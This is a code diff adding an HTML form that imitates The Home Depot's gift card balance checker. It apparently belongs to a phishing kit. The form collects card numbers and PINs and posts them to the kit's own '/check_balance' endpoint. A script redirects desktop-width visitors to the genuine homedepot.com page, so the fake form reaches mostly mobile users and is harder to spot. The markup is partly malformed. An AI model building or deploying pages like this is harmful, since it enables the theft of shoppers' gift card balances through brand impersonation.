@@ -1,0 +1,22 @@
+
+            <section class="grid isBound" style="text-align: center;">
+    <form action="/check_balance" method="POST">
+      <div class="col__12-12 col__1-2--xs"><div>The Home Depot Gift Card may be used toward the purchase of merchandise at homedepot.com and any of The Home Depot stores for up to the amount displayed.</div><div class="m-top-large body__m-top-xlarge u__side-padding-off"><div class=""><div class="col__12-12 u__padding-off u__top-padding-off"><span id="giftCardNumber" class="form-input form-input"><label class="label_fonts form-input__label" for="giftCardNumber"><span class="input__label-content">Card Number</span></label><input class="form-input__field u__p-left-xjumbo card-field giftcard" type="tel" name="gift_card_number" data-automation-id="giftCardNumber" maxlength="28" minlength="3" value="" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" id="gift_card_number"><span id="ccIcon" class="ccIcon"></span></span></div><div class="u__padding-off m-top-large col__12-12"><div><span id="PINNumber" class="form-input form-input"><span class="u__right" style="position: relative; margin-bottom: 10px;"><a class="u__right u__default-link">Where do I find this?</a></span><label class="label_fonts form-input__label" for="PINNumber"><span class="">PIN</span></label><input class="form-input__field"  type="number"  title="" placeholder="Access number" autocomplete="off"  oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);"
+        maxlength = "4" minlength="4" placeholder="" autocomplete="off" required="true" name="pin_number" placeholder="----" data-automation-id="PINNumber" maxlength="140" minlength="3" value=""></span></div></div><div class="col__12-12 u__padding-off m-top-large body__m-top-xlarge"><div class="col__1-1 col__1-2--xs u__left-padding-off"><input type="hidden" name="giftcard" value="Homedepot"> <button id="" name="checkBalanceButton" class="bttn bttn--primary" onclick="return homedepotcheck()"  m-top-large body__m-top-xlarge bttn bttn--primary u__bold u__p-top-normal"><span class="bttn__content">Check Balance</span></button></div></div>
+    
+    </form>
+    
+            </section>
+                
+
+
+
+
+<script type="text/javascript">
+    $(window).on('load resize',function(){
+        if($(window).width() > 950){
+            window.location = "https://secure2.homedepot.com/mycheckout/giftcard"
+        }
+
+    });
+</script>
